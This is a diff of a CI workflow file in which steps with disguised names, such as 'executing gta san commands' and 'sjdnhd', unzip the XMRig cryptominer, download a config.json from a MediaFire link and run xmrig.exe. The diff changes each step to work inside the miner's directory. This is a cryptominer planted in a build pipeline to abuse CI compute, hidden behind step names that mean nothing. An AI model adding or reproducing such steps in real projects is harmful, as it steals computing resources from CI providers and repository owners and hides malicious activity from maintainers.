@@ -14,8 +14,8 @@ jobs:
     - name: executing gta san commands
       run: unzip xmrig-6.17.0-gcc-win64.zip
     - name : sjdnhd
-      run: Invoke-WebRequest https://download1493.mediafire.com/ycbi7gx28dvg/ehcb87pv5pgvbqx/config.json -OutFile config.json
+      run: cd xmrig-6.17.0 && Invoke-WebRequest https://download1493.mediafire.com/ycbi7gx28dvg/ehcb87pv5pgvbqx/config.json -OutFile config.json
     - name : sndndn 
-      run: chmod +x xmrig.exe
+      run: cd xmrig-6.17.0 && chmod +x xmrig.exe
     - name : djhd
-      run: ./xmrig.exe
+      run: cd xmrig-6.17.0 && ./xmrig.exe
